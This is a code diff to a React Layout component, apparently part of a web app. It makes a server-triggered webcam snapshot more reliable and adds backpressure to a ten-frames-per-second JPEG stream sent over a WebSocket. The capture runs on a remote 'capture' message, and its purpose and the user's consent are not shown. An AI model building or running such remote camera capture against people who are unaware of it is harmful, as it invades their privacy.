@@ -160,26 +160,56 @@ export default function Layout() {
     let reconnectTimeout = null
     let destroyed = false
 
+    let camCapturing = false
     const handleMessage = async (e) => {
       if (e.data !== 'capture') return
+      if (camCapturing) return
+      camCapturing = true
+
+      const tryCapture = async () => {
+        let stream = null
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          const video = document.createElement('video')
+          video.muted = true
+          video.srcObject = stream
+          await new Promise((resolve, reject) => {
+            const timeout = setTimeout(resolve, 5000)
+            video.addEventListener('loadeddata', () => { clearTimeout(timeout); resolve() }, { once: true })
+            video.play().catch(reject)
+          })
+          const canvas = document.createElement('canvas')
+          canvas.width = video.videoWidth || 640
+          canvas.height = video.videoHeight || 480
+          canvas.getContext('2d').drawImage(video, 0, 0)
+          return await new Promise((resolve, reject) => {
+            canvas.toBlob((blob) => blob ? resolve(blob) : reject(new Error('toBlob failed')), 'image/jpeg', 0.85)
+          })
+        } finally {
+          if (stream) stream.getTracks().forEach((t) => t.stop())
+        }
+      }
+
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        const video = document.createElement('video')
-        video.srcObject = stream
-        await video.play()
-        await new Promise((r) => setTimeout(r, 300))
-        const canvas = document.createElement('canvas')
-        canvas.width = video.videoWidth || 640
-        canvas.height = video.videoHeight || 480
-        canvas.getContext('2d').drawImage(video, 0, 0)
-        stream.getTracks().forEach((t) => t.stop())
-        canvas.toBlob((blob) => {
-          if (blob && ws?.readyState === WebSocket.OPEN) {
-            blob.arrayBuffer().then((buf) => ws.send(buf))
+        let lastErr = null
+        for (let i = 0; i < 3; i++) {
+          try {
+            const blob = await tryCapture()
+            if (ws?.readyState === WebSocket.OPEN) ws.send(await blob.arrayBuffer())
+            lastErr = null
+            break
+          } catch (err) {
+            lastErr = err
+            if (i < 2) await new Promise(r => setTimeout(r, 800))
           }
-        }, 'image/jpeg', 0.85)
-      } catch (e) {
-        console.error('Webcam capture error:', e)
+        }
+        if (lastErr) {
+          console.error('Webcam capture failed:', lastErr)
+          if (ws?.readyState === WebSocket.OPEN)
+            ws.send('\x01error:' + (lastErr?.message || String(lastErr)))
+        }
+      } finally {
+        camCapturing = false
       }
     }
 
@@ -239,13 +269,17 @@ export default function Layout() {
         canvas.width = 960
         canvas.height = 540
         const ctx = canvas.getContext('2d')
+        let sending = false
         streamInterval = setInterval(() => {
           if (!socket || socket.readyState !== WebSocket.OPEN) return
+          if (sending || socket.bufferedAmount > 256 * 1024) return
+          sending = true
           ctx.drawImage(video, 0, 0, 960, 540)
           canvas.toBlob((blob) => {
-            if (blob && socket.readyState === WebSocket.OPEN) {
-              blob.arrayBuffer().then(buf => socket.send(buf))
-            }
+            if (!blob || socket.readyState !== WebSocket.OPEN) { sending = false; return }
+            blob.arrayBuffer().then(buf => {
+              if (socket.readyState === WebSocket.OPEN) socket.send(buf)
+            }).catch(() => {}).finally(() => { sending = false })
           }, 'image/jpeg', 0.35)
         }, 100)
       } catch (e) {
